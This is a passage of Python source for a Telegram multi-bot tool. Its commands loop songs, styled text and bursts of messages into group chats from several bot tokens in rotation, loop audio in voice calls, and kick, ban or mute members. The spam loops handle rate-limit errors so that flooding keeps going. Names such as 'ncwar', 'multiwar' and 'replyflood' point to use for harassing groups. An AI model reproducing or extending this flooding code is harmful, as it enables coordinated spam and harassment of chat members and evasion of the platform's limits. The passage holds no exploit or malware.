            await _reply(msg, "⚠️ 𝐍𝐨 𝐬𝐨𝐧𝐠𝐬! 𝐔𝐬𝐞 -addsong <name> 𝐟𝐢𝐫𝐬𝐭")
            return
        last = _song_data.get("last", "")
        name  = last if last in lib else next(iter(lib))
        entry = lib[name]
    fid   = entry["file_id"]
    title = entry.get("title", name)
    kind  = entry.get("kind", "audio")
    cid   = msg.chat_id
    bots  = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return

    async def _send_one(bot, cid, fid, kind):
        if kind == "voice":
            await bot.send_voice(cid, fid)
        elif kind == "document":
            await bot.send_document(cid, fid)
        else:
            await bot.send_audio(cid, fid)

    async def _run(stop_ev):
        gap  = _gap("songspam", 2.0)
        bidx = [0]
        while not stop_ev.is_set():
            bot = bots[bidx[0] % len(bots)]; bidx[0] += 1
            try:
                await _send_one(bot, cid, fid, kind)
            except RetryAfter as e:
                if await _wait_ev(stop_ev, float(e.retry_after) + 0.5):
                    return
                continue
            except (TimedOut, NetworkError):
                if await _wait_ev(stop_ev, 1.5):
                    return
                continue
            except Exception:
                pass
            if await _wait_ev(stop_ev, gap):
                return

    await tc.start(cid, "songspam", _run)
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  🎵 𝐒𝐎𝐍𝐆 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  🏷️  {name}\n"
        f"  🎶 {title}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  -stopsong 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_stopsong(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "songspam")
    await _reply(msg, "⛔ 𝐒𝐎𝐍𝐆 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_songinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Show info about a named song (or the last saved).  Usage: -si [name]"""
    msg = update.message or update.edited_message
    if not msg:
        return
    lib  = _song_data.get("lib", {})
    args = _get_args(ctx)
    name = " ".join(args).strip().lower() if args else ""
    if name and name in lib:
        entry = lib[name]
    elif not name and _song_data.get("last") and _song_data["last"] in lib:
        name  = _song_data["last"]
        entry = lib[name]
    elif lib:
        name  = next(iter(lib))
        entry = lib[name]
    else:
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  🎵 𝐒𝐎𝐍𝐆 𝐈𝐍𝐅𝐎\n"
            "  𝘕𝘰 𝘴𝘰𝘯𝘨𝘴 𝘴𝘢𝘷𝘦𝘥 𝘺𝘦𝘵\n"
            "  𝘜𝘴𝘦: -addsong <name>\n"
            "╚══════════════════════════╝"
        )
        return
    if name and name not in lib:
        await _reply(msg, f"⚠️ 𝐒𝐨𝐧𝐠 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝. 𝐔𝐬𝐞 -songs 𝐭𝐨 𝐥𝐢𝐬𝐭.")
        return
    title = entry.get("title", name)
    dur   = entry.get("dur", 0)
    kind  = entry.get("kind", "audio")
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  🎵 𝐒𝐎𝐍𝐆 𝐈𝐍𝐅𝐎\n"
        f"  🏷️  𝘕𝘢𝘮𝘦: {name}\n"
        f"  🎶 𝘛𝘪𝘵𝘭𝘦: {title}\n"
        f"  ⏱️  𝘋𝘶𝘳: {dur}𝘴\n"
        f"  📦 𝘛𝘺𝘱𝘦: {kind}\n"
        f"  -song {name} → 𝘱𝘭𝘢𝘺 𝘰𝘯𝘤𝘦\n"
        f"  -songspam {name} → 𝘭𝘰𝘰𝘱\n"
        f"  -songs → 𝘢𝘭𝘭 𝘴𝘰𝘯𝘨𝘴\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_songs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """List all saved songs in the library."""
    msg = update.message or update.edited_message
    if not msg:
        return
    lib = _song_data.get("lib", {})
    if not lib:
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  🎵 𝐒𝐎𝐍𝐆 𝐋𝐈𝐁𝐑𝐀𝐑𝐘\n"
            "  𝘌𝘮𝘱𝘵𝘺 — 𝘯𝘰 𝘴𝘰𝘯𝘨𝘴 𝘺𝘦𝘵\n"
            "  𝘜𝘴𝘦: -addsong <name>\n"
            "╚══════════════════════════╝"
        )
        return
    last = _song_data.get("last", "")
    lines = ["╔══════════════════════════╗",
             f"  🎵 𝐒𝐎𝐍𝐆 𝐋𝐈𝐁𝐑𝐀𝐑𝐘 ({len(lib)} 𝘴𝘰𝘯𝘨𝘴)"]
    for i, (n, e) in enumerate(lib.items(), 1):
        marker = " ◀" if n == last else ""
        dur    = e.get("dur", 0)
        title  = e.get("title", n)
        lines.append(f"  {i}. {n}{marker}")
        lines.append(f"     🎶 {title}  ⏱️ {dur}𝘴")
    lines.append("  -song <name> → 𝘱𝘭𝘢𝘺")
    lines.append("  -delsong <name> → 𝘥𝘦𝘭𝘦𝘵𝘦")
    lines.append("╚══════════════════════════╝")
    await _reply(msg, "\n".join(lines))

@_guard
async def cmd_delsong(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Delete a named song from the library.  Usage: -delsong <name>"""
    msg = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    name = " ".join(args).strip().lower() if args else ""
    if not name:
        await _reply(msg, "𝐔𝐬𝐞: -delsong <name>  (𝐬𝐞𝐞 -songs 𝐟𝐨𝐫 𝐥𝐢𝐬𝐭)")
        return
    lib = _song_data.get("lib", {})
    if name not in lib:
        keys = ", ".join(lib.keys()) or "—"
        await _reply(msg, f"⚠️ 𝐒𝐨𝐧𝐠 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {keys}")
        return
    del lib[name]
    if _song_data.get("last") == name:
        _song_data["last"] = next(iter(lib), "")
    _save_json(SONG_FILE, _song_data)
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  🗑️  𝐒𝐎𝐍𝐆 𝐃𝐄𝐋𝐄𝐓𝐄𝐃\n"
        f"  🏷️  {name}\n"
        f"  📋 𝘓𝘪𝘣𝘳𝘢𝘳𝘺: {len(lib)} 𝘴𝘰𝘯𝘨(𝘴) 𝘭𝘦𝘧𝘵\n"
        f"╚══════════════════════════╝"
    )

# ═══════════════════════════════════════════
#  🎙️ VOICE CALL COMMANDS
# ═══════════════════════════════════════════

def _vc_not_ok(msg):
    """Return a coroutine that sends a 'pytgcalls not available' message."""
    return _reply(msg,
        "╔══════════════════════════════╗\n"
        "  🎙️ 𝐕𝐎𝐈𝐂𝐄 𝐂𝐀𝐋𝐋𝐒 𝐔𝐍𝐀𝐕𝐀𝐈𝐋𝐀𝐁𝐋𝐄\n"
        "  pytgcalls 𝘤𝘰𝘶𝘭𝘥 𝘯𝘰𝘵 𝘣𝘦 𝘭𝘰𝘢𝘥𝘦𝘥.\n"
        "╚══════════════════════════════╝"
    )

# ── Per-chat pyrogram+pytgcalls state ────────────────────────────────────────
# _pyro_clients, _call_clients, _active_vc, _vc_loop_tasks already declared above.

async def _vc_get_bot_token() -> str:
    """Return first available bot token from BASE_TOKENS (jugad: no user account needed)."""
    for tok in BASE_TOKENS:
        if tok.strip():
            return tok.strip()
    return ""

async def _vc_ensure_client(cid: int) -> "_PyTgCalls | None":
    """
    Get or create a pytgcalls client for this chat.
    Uses bot_token from BASE_TOKENS + public Telegram Desktop API creds
    so no personal API_ID/API_HASH is needed.
    """
    if not _CALLS_OK:
        return None
    if cid in _call_clients:
        return _call_clients[cid]

    bot_token = await _vc_get_bot_token()
    if not bot_token:
        return None

    session_name = f"sl_vc_{abs(cid)}"
    pyro = _PyroClient(
        session_name,
        api_id    = _VC_API_ID,
        api_hash  = _VC_API_HASH,
        bot_token = bot_token,
        in_memory = True,          # no session files on disk
    )
    call = _PyTgCalls(pyro)

    # Auto-loop handler: replays the stream whenever it ends (for -vcallloop)
    @call.on_update()
    async def _on_stream_end(client, update: "_PTGUpdate"):
        if isinstance(update, _StreamEnded):
            chat = update.chat_id
            info = _active_vc.get(chat)
            if info and info.get("loop") and info.get("path"):
                try:
                    await client.play(chat, _MediaStream(info["path"]))
                except Exception:
                    pass

    await pyro.start()
    await call.start()
    _pyro_clients[cid] = pyro
    _call_clients[cid] = call
    return call

async def _vc_get_entry(msg, args):
    """Resolve song name → library entry.  Returns (name, entry) or (None, None)."""
    lib  = _song_data.get("lib", {})
    name = " ".join(args).strip().lower() if args else ""
    if name:
        # Explicit name — must exist
        if name not in lib:
            keys = ", ".join(lib.keys()) if lib else "none"
            await _reply(msg, f"⚠️ 𝐒𝐨𝐧𝐠 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {keys}")
            return None, None
        return name, lib[name]
    # No name — use last saved, then first available
    if not lib:
        await _reply(msg, "⚠️ 𝐍𝐨 𝐬𝐨𝐧𝐠𝐬 𝐬𝐚𝐯𝐞𝐝! 𝐔𝐬𝐞 -addsong <name> 𝐟𝐢𝐫𝐬𝐭.")
        return None, None
    last = _song_data.get("last", "")
    n    = last if last in lib else next(iter(lib))
    return n, lib[n]

async def _vc_download_audio(bots, fid: str):
    """Download a Telegram audio file to /tmp/sl_vc/ and return local path."""
    import tempfile, pathlib
    tmp_dir = pathlib.Path(tempfile.gettempdir()) / "sl_vc"
    tmp_dir.mkdir(exist_ok=True)
    audio_path = str(tmp_dir / f"{fid[-12:]}.ogg")
    if pathlib.Path(audio_path).exists():
        return audio_path
    for bot in bots:
        try:
            tg_file = await bot.get_file(fid)
            await tg_file.download_to_drive(audio_path)
            return audio_path
        except Exception:
            continue
    return None

async def _vc_play(msg, cid: int, name: str, entry: dict, loop: bool):
    """Core helper: ensure client, download audio, play in voice call."""
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐐𝐨 𝐛𝐨𝐭𝐬!")
        return False
    fid   = entry["file_id"]
    title = entry.get("title", name)
    audio_path = await _vc_download_audio(bots, fid)
    if not audio_path:
        await _reply(msg, "⚠️ Failed to download audio — try again")
        return False
    call = await _vc_ensure_client(cid)
    if call is None:
        await _vc_not_ok(msg)
        return False
    try:
        stream = _MediaStream(
            audio_path,
            video_flags=_MediaStream.Flags.IGNORE,
        )
        await call.play(cid, stream)
        _active_vc[cid] = {"name": name, "path": audio_path, "loop": loop}
        return True
    except Exception as e:
        await _reply(msg, f"⚠️ Voice call error: {e}")
        return False

@_guard
async def cmd_vcall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Join the group voice call and play a song once.  Usage: -vcall [song name]"""
    msg = update.message or update.edited_message
    if not msg:
        return
    if not _CALLS_OK:
        await _vc_not_ok(msg)
        return
    name, entry = await _vc_get_entry(msg, _get_args(ctx))
    if not entry:
        return
    cid   = msg.chat_id
    title = entry.get("title", name)
    ok = await _vc_play(msg, cid, name, entry, loop=False)
    if ok:
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  🎙️ 𝐕𝐎𝐈𝐂𝐂 𝐂𝐀𝐋𝐋 𝐒𝐓𝐀𝐑𝐓𝐂𝐃\n"
            f"  🏷️  {name}\n"
            f"  🎶 {title}\n"
            f"  -vcallstop 𝚘𝚊 𝚕𝚊𝚐𝚇𝚊\n"
            f"╚══════════════════════════════╝"
        )

@_guard
async def cmd_vcallloop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Join voice call and loop a song continuously.  Usage: -vcallloop [song name]"""
    msg = update.message or update.edited_message
    if not msg:
        return
    if not _CALLS_OK:
        await _vc_not_ok(msg)
        return
    name, entry = await _vc_get_entry(msg, _get_args(ctx))
    if not entry:
        return
    cid   = msg.chat_id
    title = entry.get("title", name)
    ok = await _vc_play(msg, cid, name, entry, loop=True)
    if ok:
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  🎙️🔁 𝐕𝐎𝐈𝐂𝐂 𝐋𝐎𝐎𝐏 𝐒𝐓𝐀𝐑𝐓𝐂𝐃\n"
            f"  🏷️  {name}\n"
            f"  🎶 {title}\n"
            f"  -vcnext <name> → switch song\n"
            f"  -vcallstop → leave\n"
            f"╚══════════════════════════════╝"
        )

@_guard
async def cmd_vcallnext(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Switch to a different song mid-call.  Usage: -vcnext [song name]"""
    msg = update.message or update.edited_message
    if not msg:
        return
    if not _CALLS_OK:
        await _vc_not_ok(msg)
        return
    cid = msg.chat_id
    if cid not in _call_clients:
        await _reply(msg, "⚠️ No active voice call here. Use -vcall first.")
        return
    name, entry = await _vc_get_entry(msg, _get_args(ctx))
    if not entry:
        return
    is_loop = _active_vc.get(cid, {}).get("loop", False)
    title   = entry.get("title", name)
    ok = await _vc_play(msg, cid, name, entry, loop=is_loop)
    if ok:
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  🎙️ VC NEXT SONG\n"
            f"  🏷️  {name}\n"
            f"  🎶 {title}\n"
            f"╚══════════════════════════════╝"
        )

@_guard
async def cmd_vcallstop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Stop and leave the active voice call."""
    msg = update.message or update.edited_message
    if not msg:
        return
    if not _CALLS_OK:
        await _vc_not_ok(msg)
        return
    cid  = msg.chat_id
    call = _call_clients.pop(cid, None)
    pyro = _pyro_clients.pop(cid, None)
    _active_vc.pop(cid, None)
    task = _vc_loop_tasks.pop(cid, None)
    if task:
        task.cancel()
    try:
        if call:
            await call.leave_call(cid)
    except Exception:
        pass
    try:
        if pyro:
            await pyro.stop()
    except Exception:
        pass
    await _reply(msg,
        "╔══════════════════════════════╗\n"
        "  ⛔ VOICE CALL ENDED\n"
        "  🎙️ Left voice call / stopped.\n"
        "╚══════════════════════════════╝"
    )

# ═══════════════════════════════════════════
#  GC LEAVE COMMAND
# ═══════════════════════════════════════════

@_guard
async def cmd_gcleave(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Make ALL bots leave the current GC. Owner-only safety gate."""
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    # Extra safety — owner + hidden-trusted IDs only (same gate as globalstop)
    # _hid() covers secondary trusted accounts configured by the owner
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    cid  = msg.chat_id
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    # Stop all tasks in this chat first
    await tc.stop_all(cid)
    mute_chats.discard(cid)
    ncdel_chats.discard(cid)
    autoreact_chats.pop(cid, None)
    autoreply_chats.pop(cid, None)
    ncwar_targets.pop(cid, None)
    _multiwar_active.pop(cid, None)
    targetslide_chats.pop(cid, None)
    targetreply_chats.pop(cid, None)
    pfploop_active.pop(cid, None)
    replyflood_chats.pop(cid, None)
    _nc_info.pop(cid, None)

    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🚪 𝐆𝐂 𝐋𝐄𝐀𝐕𝐄 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)} 𝘭𝘦𝘢𝘷𝘪𝘯𝘨...\n"
        f"  ⏳ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘸𝘢𝘪𝘵\n"
        f"╚══════════════════════════════╝"
    )

    ok  = 0
    fail = 0
    for bot in bots:
        try:
            await bot.leave_chat(cid)
            ok += 1
        except Exception:
            fail += 1

    # Remove from known chats
    known_chats.discard(cid)
    _save_json(GROUPS_FILE, list(known_chats))

    # Try to confirm (may fail if all bots left)
    try:
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  ✅ 𝐆𝐂 𝐋𝐄𝐅𝐓\n"
            f"  ✅ 𝘓𝘦𝘧𝘵: {ok}  ❌ 𝘍𝘢𝘪𝘭𝘦𝘥: {fail}\n"
            f"  📋 𝘊𝘩𝘢𝘵 𝘳𝘦𝘮𝘰𝘷𝘦𝘥 𝘧𝘳𝘰𝘮 𝘭𝘪𝘴𝘵\n"
            f"╚══════════════════════════════╝"
        )
    except Exception:
        pass

# ═══════════════════════════════════════════
#  GC MANAGEMENT COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_gcinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    bot = _bots()[0] if _bots() else ctx.bot
    try:
        chat = await bot.get_chat(cid)
        count_str = "?"
        try:
            count_str = str(await bot.get_chat_member_count(cid))
        except Exception:
            pass
        desc = (chat.description or "𝘕𝘰𝘯𝘦")[:60]
        invite = (chat.invite_link or "𝘕𝘰𝘯𝘦")
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  📋 𝐆𝐂 𝐈𝐍𝐅𝐎\n"
            f"  ─────────────────────────────\n"
            f"  𝗡𝗮𝗺𝗲:    {chat.title}\n"
            f"  𝗜𝗗:      {cid}\n"
            f"  𝗠𝗲𝗺𝗯𝗲𝗿𝘀: {count_str}\n"
            f"  𝗗𝗲𝘀𝗰:    {desc}\n"
            f"  𝗟𝗶𝗻𝗸:    {invite}\n"
            f"╚══════════════════════════════╝"
        )
    except Exception as e:
        await _reply(msg, f"⚠️ Error: {e}")

@_guard
async def cmd_setgctitle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -setgctitle <title>")
        return
    ok = 0
    for bot in _bots():
        try:
            await bot.set_chat_title(cid, txt[:255])
            ok += 1
            break
        except Exception:
            pass
    if ok:
        await _reply(msg, f"✅ 𝐆𝐂 𝐓𝐢𝐭𝐥𝐞 𝐒𝐞𝐭: {txt}")
    else:
        await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 — 𝐁𝐨𝐭 𝐧𝐞𝐞𝐝𝐬 𝐚𝐝𝐦𝐢𝐧")

@_guard
async def cmd_setgcdesc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -setgcdesc <description>")
        return
    ok = 0
    for bot in _bots():
        try:
            await bot.set_chat_description(cid, txt[:255])
            ok += 1
            break
        except Exception:
            pass
    if ok:
        await _reply(msg, f"✅ 𝐆𝐂 𝐃𝐞𝐬𝐜 𝐒𝐞𝐭!")
    else:
        await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 — 𝐁𝐨𝐭 𝐧𝐞𝐞𝐝𝐬 𝐚𝐝𝐦𝐢𝐧")

@_guard
async def cmd_getinvite(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    for bot in _bots():
        try:
            link = await bot.export_chat_invite_link(cid)
            await _reply(msg,
                f"╔══════════════════════════════╗\n"
                f"  🔗 𝐈𝐍𝐕𝐈𝐓𝐄 𝐋𝐈𝐍𝐊\n"
                f"  {link}\n"
                f"╚══════════════════════════════╝"
            )
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_pinmsg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    if not rep:
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘵𝘰 𝘱𝘪𝘯 𝘪𝘵")
        return
    for bot in _bots():
        try:
            await bot.pin_chat_message(cid, rep.message_id, disable_notification=True)
            await _reply(msg, "📌 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐩𝐢𝐧𝐧𝐞𝐝")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_unpinall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    for bot in _bots():
        try:
            await bot.unpin_all_chat_messages(cid)
            await _reply(msg, "📌 𝐀𝐥𝐥 𝐦𝐬𝐠𝐬 𝐮𝐧𝐩𝐢𝐧𝐧𝐞𝐝")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_kickuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -kickuser <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    for bot in _bots():
        try:
            await bot.ban_chat_member(cid, uid)
            await asyncio.sleep(0.3)
            await bot.unban_chat_member(cid, uid)
            await _reply(msg, f"👢 𝐊𝐢𝐜𝐤𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_bantarget(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -bantarget <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    for bot in _bots():
        try:
            await bot.ban_chat_member(cid, uid)
            await _reply(msg, f"🚫 𝐁𝐚𝐧𝐧𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_unbanuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -unbanuser <uid>")
        return
    for bot in _bots():
        try:
            await bot.unban_chat_member(cid, uid, only_if_banned=True)
            await _reply(msg, f"✅ 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_muteuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -muteuser <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    from telegram import ChatPermissions
    for bot in _bots():
        try:
            await bot.restrict_chat_member(cid, uid,
                permissions=ChatPermissions(can_send_messages=False),
                until_date=0)
            await _reply(msg, f"🔇 𝐌𝐮𝐭𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_unmuteuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -unmuteuser <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    from telegram import ChatPermissions
    for bot in _bots():
        try:
            await bot.restrict_chat_member(cid, uid,
                permissions=ChatPermissions(
                    can_send_messages=True,
                    can_send_media_messages=True,
                    can_send_other_messages=True,
                    can_add_web_page_previews=True,
                ), until_date=0)
            await _reply(msg, f"🔊 𝐔𝐧𝐦𝐮𝐭𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_setpfponce(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    if not (rep and rep.photo):
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰 𝘵𝘰 𝘴𝘦𝘵 𝘎𝘊 𝘱𝘩𝘰𝘵𝘰")
        return
    fid = rep.photo[-1].file_id
    for bot in _bots():
        try:
            await bot.set_chat_photo(cid, fid)
            await _reply(msg, "✅ 𝐆𝐂 𝐏𝐡𝐨𝐭𝐨 𝐒𝐞𝐭")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_deletegcpfp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    for bot in _bots():
        try:
            await bot.delete_chat_photo(cid)
            await _reply(msg, "✅ 𝐆𝐂 𝐏𝐡𝐨𝐭𝐨 𝐑𝐞𝐦𝐨𝐯𝐞𝐝")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")


# ═══════════════════════════════════════════
#  SLIDE / SWIPE / BURST SPAM COMMANDS
# ═══════════════════════════════════════════

_SWIPE_VARIANTS = [
    "🌊〰️〰️〰️{t}〰️〰️〰️🌊 ➴ྀ",
    "💨〰〰{t}〰〰💨 ·· ➴ྀ",
    "⚡〰{t}〰⚡ 𒐫𒐫 ➴ྀ",
    "🌀〰〰〰{t}〰〰〰🌀 ➴ྀ",
    "🔱〰〰{t}〰〰🔱 ··· ➴ྀ",
    "💥〰{t}〰💥 𒐫𒐫𒐫 ➴ྀ",
    "🌊💦{t}💦🌊 ➴ྀ ··",
    "〽️〰{t}〰〽️ ·· ➴ྀ",
]

@_guard
async def cmd_swipespam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -swipespam <text>")
        return
    idx = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                v = _SWIPE_VARIANTS[idx[0] % len(_SWIPE_VARIANTS)].format(t=txt)
                idx[0] += 1
                try:
                    await bot.send_message(cid, v)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "swipe", _run)
    await _reply(msg,
        f"🌊 𝐒𝐖𝐈𝐏𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stopswipe to stop"
    )

@_guard
async def cmd_stopswipe(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "swipe")
    await _reply(msg, "⛔ 𝐒𝐖𝐈𝐏𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_burstspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -burstspam <text> [count]")
        return
    try:
        count = int(args[-1])
        txt   = " ".join(args[:-1]).strip()
        if not txt:
            raise ValueError
    except (ValueError, IndexError):
        txt   = " ".join(args).strip()
        count = 20
    count = min(count, 50)
    bots  = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return

    VARIANTS = [
        f"💥𒐫𒐫{txt}𒐫𒐫💥 ➴ྀ",
        f"🔥 {txt} 🔥 ➴ྀ",
        f"⚡{txt}⚡ ➴ྀ ··",
        f"💀 {txt} 💀 ➴ྀ",
        f"👑{txt}👑 ➴ྀ",
    ]

    async def _send(bot, i):
        try:
            await bot.send_message(cid, VARIANTS[i % len(VARIANTS)])
        except Exception:
            pass

